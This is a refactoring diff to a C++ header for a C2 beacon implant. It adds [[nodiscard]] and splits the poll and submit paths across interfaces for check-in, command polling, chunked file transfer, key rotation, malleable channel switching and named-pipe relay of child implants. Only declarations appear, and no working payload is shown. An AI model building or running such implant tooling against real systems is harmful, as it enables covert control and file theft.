@@ -128,7 +128,7 @@ public:
      * @param chunk_size Preferred chunk size
      * @return SUCCESS or error code
      */
-    BeaconError startDownload(const wchar_t* file_path, uint32_t chunk_size);
+    [[nodiscard]] BeaconError startDownload(const wchar_t* file_path, uint32_t chunk_size);
 
     /**
      * @brief Handle download chunk request from server
@@ -137,12 +137,12 @@ public:
      * @param chunk_size Requested chunk size
      * @return SUCCESS or error code
      */
-    BeaconError handleDownloadChunk(uint32_t chunk_index, uint32_t offset, uint32_t chunk_size);
+    [[nodiscard]] BeaconError handleDownloadChunk(uint32_t chunk_index, uint32_t offset, uint32_t chunk_size);
 
     /**
      * @brief Get active download state (if any)
      */
-    FileTransferState* findActiveDownload();
+    [[nodiscard]] FileTransferState* findActiveDownload();
 
     // =========================================================================
     // Upload Operations
@@ -155,7 +155,7 @@ public:
      * @param chunk_size Chunk size for transfer
      * @return SUCCESS or error code
      */
-    BeaconError startUpload(const wchar_t* file_path, uint32_t file_size, uint32_t chunk_size);
+    [[nodiscard]] BeaconError startUpload(const wchar_t* file_path, uint32_t file_size, uint32_t chunk_size);
 
     /**
      * @brief Handle upload chunk data from server
@@ -166,13 +166,13 @@ public:
      * @param is_last True if this is the final chunk
      * @return SUCCESS or error code
      */
-    BeaconError handleUploadChunk(uint32_t chunk_index, uint32_t offset, 
-                                   const uint8_t* chunk_data, uint32_t chunk_size, bool is_last);
+    [[nodiscard]] BeaconError handleUploadChunk(uint32_t chunk_index, uint32_t offset, 
+                                    const uint8_t* chunk_data, uint32_t chunk_size, bool is_last);
 
     /**
      * @brief Get active upload state (if any)
      */
-    FileTransferState* findActiveUpload();
+    [[nodiscard]] FileTransferState* findActiveUpload();
 
     // =========================================================================
     // Transfer Management
@@ -187,7 +187,7 @@ public:
     /**
      * @brief Get transfer state by slot ID
      */
-    FileTransferState* getTransfer(uint8_t slot_id);
+    [[nodiscard]] FileTransferState* getTransfer(uint8_t slot_id);
 
     /**
      * @brief Reset a transfer slot
@@ -250,13 +250,14 @@ public:
     /**
      * @brief Initialize network layer
      * @param host C2 server hostname
-     * @param path Request path
+     * @param pollPath GET path for poll operations
+     * @param submitPath POST path for submit operations
      * @param user_agent User-Agent string
      * @param port Server port
      * @return SUCCESS or error code
      */
-    BeaconError initialize(const wchar_t* host, const wchar_t* path, 
-                           const wchar_t* user_agent, uint16_t port);
+    [[nodiscard]] BeaconError initialize(const wchar_t* host, const wchar_t* pollPath, 
+                           const wchar_t* submitPath, const wchar_t* user_agent, uint16_t port);
 
     /**
      * @brief Mark network as initialized (called after ::initNetwork)
@@ -279,7 +280,7 @@ public:
     /**
      * @brief Set active C2 channel: switches host/path/ua/port and resolves malleable
      * @param channelIndex Which channel in config (0..channel_count-1)
-     * @param config Parsed BeaconConfig (must have channels + channel_malleable)
+     * @param config Parsed BeaconConfig (must have channels + poll/submit malleable arrays)
      */
     void setActiveChannel(uint8_t channelIndex, const BeaconConfig& config);
 
@@ -291,7 +292,7 @@ public:
      * @brief Send initial check-in to server
      * @return SUCCESS or error code
      */
-    BeaconError sendCheckin(const char* sysinfo = nullptr, size_t sysinfo_len = 0);
+    [[nodiscard]] BeaconError sendCheckin(const char* sysinfo = nullptr, size_t sysinfo_len = 0);
 
     /**
      * @brief Poll server for new commands
@@ -299,7 +300,7 @@ public:
      * @param out_len Receives command length
      * @return SUCCESS or error code
      */
-    BeaconError pollForCommands(uint8_t** out_buffer, size_t* out_len);
+    [[nodiscard]] BeaconError pollForCommands(uint8_t** out_buffer, size_t* out_len);
 
     /**
      * @brief Send command response to server
@@ -308,7 +309,7 @@ public:
      * @param data_len Data length
      * @return SUCCESS or error code
      */
-    BeaconError sendResponse(uint8_t opcode, const uint8_t* data, size_t data_len);
+    [[nodiscard]] BeaconError sendResponse(uint8_t opcode, const uint8_t* data, size_t data_len);
 
     // =========================================================================
     // File Transfer Helpers
@@ -317,47 +318,48 @@ public:
     /**
      * @brief Send file content (legacy single-packet download)
      */
-    BeaconError sendFileContent(const wchar_t* path, const uint8_t* data, 
+    [[nodiscard]] BeaconError sendFileContent(const wchar_t* path, const uint8_t* data, 
                                  uint32_t size, uint8_t status);
 
     /**
      * @brief Send file chunk data
      */
-    BeaconError sendFileChunkData(uint32_t chunk_index, uint32_t offset, 
+    [[nodiscard]] BeaconError sendFileChunkData(uint32_t chunk_index, uint32_t offset, 
                                    uint32_t bytes_read, uint8_t status, const uint8_t* data);
 
     /**
      * @brief Send file upload acknowledgment
      */
-    BeaconError sendFileUploadAck(uint32_t chunk_index, uint8_t status);
+    [[nodiscard]] BeaconError sendFileUploadAck(uint32_t chunk_index, uint8_t status);
 
     /**
      * @brief Send file download acknowledgment
      */
-    BeaconError sendFileDownloadAck(uint32_t file_size, uint8_t status);
+    [[nodiscard]] BeaconError sendFileDownloadAck(uint32_t file_size, uint8_t status);
 
     /**
      * @brief Send list files result
      */
-    BeaconError sendListFilesResult(const uint8_t* entries, uint32_t entry_count, 
+    [[nodiscard]] BeaconError sendListFilesResult(const uint8_t* entries, uint32_t entry_count, 
                                      uint8_t status, const wchar_t* error_msg);
 
     /**
      * @brief Send key rotation acknowledgment
      */
-    BeaconError sendKeyRotateAck(uint8_t status);
+    [[nodiscard]] BeaconError sendKeyRotateAck(uint8_t status);
 
     /**
      * @brief Send file write result
      */
-    BeaconError sendFileWriteResult(uint8_t status);
+    [[nodiscard]] BeaconError sendFileWriteResult(uint8_t status);
 
 private:
     bool              m_initialized;
     wchar_t           m_host[256];
-    wchar_t           m_path[256];
+    wchar_t           m_pollPath[256];
+    wchar_t           m_submitPath[256];
     wchar_t           m_userAgent[256];
-    wchar_t           m_wcsBuf[512];       // Reusable wchar conversion buffer (eliminates 3 mallocs per channel switch)
+    wchar_t           m_wcsBuf[512];
     uint16_t          m_port;
 };
 
@@ -394,7 +396,7 @@ public:
      * @param handler Handler function
      * @return SUCCESS or error code
      */
-    BeaconError registerHandler(uint8_t opcode, HandlerFunc handler);
+    [[nodiscard]] BeaconError registerHandler(uint8_t opcode, HandlerFunc handler);
 
     /**
      * @brief Dispatch a command to its handler
@@ -403,7 +405,7 @@ public:
      * @param args_len Argument length
      * @return true if beacon should exit, false to continue
      */
-    bool dispatch(uint8_t opcode, const uint8_t* args, size_t args_len);
+    [[nodiscard]] bool dispatch(uint8_t opcode, const uint8_t* args, size_t args_len);
 
     /**
      * @brief Initialize all built-in handlers
@@ -465,14 +467,14 @@ void relayDisable();
  * @param pipe_id Server-assigned local pipe ID
  * @return true on success
  */
-bool relayAddChild(const wchar_t* pipe_name, size_t pipe_name_len, uint32_t pipe_id);
+[[nodiscard]] bool relayAddChild(const wchar_t* pipe_name, size_t pipe_name_len, uint32_t pipe_id);
 
 /**
  * @brief Remove a child from the relay list (RELAY_REMOVE_CHILD handler)
  * @param pipe_id Server-assigned local pipe ID
  * @return true if found and removed
  */
-bool relayRemoveChild(uint32_t pipe_id);
+[[nodiscard]] bool relayRemoveChild(uint32_t pipe_id);
 
 /**
  * @brief Relay child data upstream to server (RELAY_CHILD_UP)
